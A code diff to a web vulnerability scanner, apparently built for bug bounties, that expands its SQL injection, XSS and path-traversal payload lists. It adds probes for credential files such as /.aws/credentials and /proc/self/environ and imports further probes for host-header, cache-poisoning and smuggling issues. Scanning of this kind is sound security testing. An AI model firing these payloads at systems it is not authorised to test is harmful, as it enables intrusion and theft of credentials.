@@ -38,13 +38,19 @@
 
 import { URL } from "node:url";
 import { randomBytes, createHash } from "node:crypto";
+import {
+  EXTRA_PATHS, EXTRA_SECRETS,
+  probeGraphQL, scanJwts, probeHostHeader, probeCachePoisoning,
+  smugglingIndicators, probeProtoPollution, scanDomSinks,
+  subdomainEnum, detectWebsocket, probeFormBodies, probeExtraMethods,
+} from "./vuln-scan-extra.js";
 
-const UA = "YORU-DeepScan/2.0 (+bug-bounty; contact: owner)";
+const UA = "YORU-DeepScan/2.1 (+bug-bounty; contact: owner)";
 const TIMEOUT_MS = 15_000;
 const MAX_BODY_BYTES = 800_000;
-const MAX_CRAWL_PAGES = 25;
-const MAX_PARAM_PROBES = 60;
-const CONCURRENCY = 6;
+const MAX_CRAWL_PAGES = 60;
+const MAX_PARAM_PROBES = 120;
+const CONCURRENCY = 8;
 
 const MARKER = () => "yoru" + randomBytes(4).toString("hex");
 
@@ -107,12 +113,21 @@ function mkFinding(f) {
 
 // ───────────────────────── payload catalogues ─────────────────────────
 
-const SQLI_PAYLOADS = [`'`, `"`, `' OR '1'='1`, `1)) OR 1=1--`, `' AND SLEEP(0)--`, `';SELECT pg_sleep(0)--`];
+const SQLI_PAYLOADS = [
+  `'`, `"`, `\``, `\\`, `%27`, `%2527`,
+  `' OR '1'='1`, `" OR "1"="1`, `1)) OR 1=1--`, `') OR ('1'='1`,
+  `' OR 1=1-- -`, `admin'--`, `admin'/*`, `' UNION SELECT NULL--`,
+  `' UNION SELECT NULL,NULL--`, `' UNION SELECT NULL,NULL,NULL--`,
+  `' AND SLEEP(0)--`, `';SELECT pg_sleep(0)--`,
+  `'/**/OR/**/1=1--`, `'%09OR%091=1--`, `'||'a'='a`,
+];
 const SQLI_TIME_PAYLOADS = [
   { p: `';SELECT pg_sleep(5)--`, engine: "postgres" },
   { p: `' OR SLEEP(5)-- -`, engine: "mysql" },
   { p: `';WAITFOR DELAY '0:0:5'--`, engine: "mssql" },
   { p: `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--`, engine: "oracle" },
+  { p: `'||pg_sleep(5)||'`, engine: "postgres" },
+  { p: `'/**/AND/**/SLEEP(5)#`, engine: "mysql" },
 ];
 const SQLI_BOOL_PAIRS = [
   { t: `' AND '1'='1`, f: `' AND '1'='2` },
@@ -135,6 +150,10 @@ const XSS_PAYLOADS = (m) => [
   { p: `'><img src=x onerror=${m}>`, ctx: "attr-single" },
   { p: `javascript:${m}`, ctx: "url" },
   { p: `${m}"-alert(1)-"`, ctx: "js" },
+  { p: `<iframe srcdoc="<script>${m}</script>">`, ctx: "html" },
+  { p: `<details/open/ontoggle=alert(1)>${m}`, ctx: "html" },
+  { p: `"><svg><animate onbegin=alert(1) attributeName=x></svg>${m}`, ctx: "attr" },
+  { p: `<img src=x onerror=confirm\`1\`>${m}`, ctx: "html-nobracket" },
 ];
 
 const LFI_PAYLOADS = [
@@ -142,6 +161,9 @@ const LFI_PAYLOADS = [
   "....//....//....//etc/passwd", "/etc/passwd%00",
   "..\\..\\..\\windows\\win.ini", "C:\\windows\\win.ini",
   "php://filter/convert.base64-encode/resource=index",
+  "..%252f..%252f..%252fetc%252fpasswd",
+  "/proc/self/environ", "/proc/self/cmdline",
+  "expect://id", "data://text/plain,YORU",
 ];
 const LFI_MARKERS = [/root:x:0:0:/i, /\[extensions\]/i, /for 16-bit app support/i, /PD9waHA/];
 
@@ -209,6 +231,7 @@ const COMMON_PATHS = [
   "/.aws/credentials", "/aws.json", "/gcp.json",
   "/composer.json", "/composer.lock", "/package.json", "/yarn.lock",
   "/webpack.config.js", "/vite.config.js",
+  ...EXTRA_PATHS,
 ];
 
 const SECRET_PATTERNS = [
@@ -225,6 +248,7 @@ const SECRET_PATTERNS = [
   { name: "Mongo URI", r: /mongodb(?:\+srv)?:\/\/[^\s"']+/g, sev: "high" },
   { name: "Postgres URI", r: /postgres(?:ql)?:\/\/[^\s"']+/g, sev: "high" },
   { name: "Redis URI", r: /redis:\/\/[^\s"']+/g, sev: "medium" },
+  ...EXTRA_SECRETS,
 ];
 
 // ────────────────────────── discovery ──────────────────────────
@@ -844,9 +868,33 @@ export async function scanTarget(target, opts = {}) {
   onNote("checking NVD for known CVEs");
   const cves = await cveLookup(fingerprints, onNote);
 
+  onNote("deep probes: graphql · host-header · cache · proto-pollution · smuggling · webdav");
+  const [
+    graphqlF, hostF, cacheF, protoF, extraMethodF, formF,
+  ] = await Promise.all([
+    probeGraphQL(u.origin, onNote).catch(() => []),
+    probeHostHeader(baseline.url).catch(() => []),
+    probeCachePoisoning(baseline.url).catch(() => []),
+    probeProtoPollution([...paramUrls][0] || baseline.url).catch(() => []),
+    probeExtraMethods(baseline.url).catch(() => []),
+    probeFormBodies(forms, onNote).catch(() => []),
+  ]);
+  const smugglingF = smugglingIndicators(baseline.url, baseline.headers);
+  const jwtF = [];
+  for (const p of pages) jwtF.push(...scanJwts(p.url, p.body));
+  jwtF.push(...scanJwts(baseline.url, String(baseline.headers["set-cookie"] || "")));
+  const domF = [];
+  for (const p of pages) if (/\.js(?:\?|$)/i.test(p.url) || /<script/i.test(p.body)) domF.push(...scanDomSinks(p.url, p.body));
+  const wsF = detectWebsocket(baseline.url, baseline.headers, baseline.body);
+
+  onNote("enumerating subdomains via CT logs");
+  const subF = await subdomainEnum(u.hostname, onNote).catch(() => []);
+
   const allFindings = [
     ...headerFindings, ...secretFindings, ...takeoverFindings,
     ...pathFindings, ...methodFindings, ...paramFindings, ...csrfFindings,
+    ...graphqlF, ...hostF, ...cacheF, ...protoF, ...extraMethodF, ...formF,
+    ...smugglingF, ...jwtF, ...domF, ...wsF, ...subF,
   ];
 
   // Normalize + dedupe
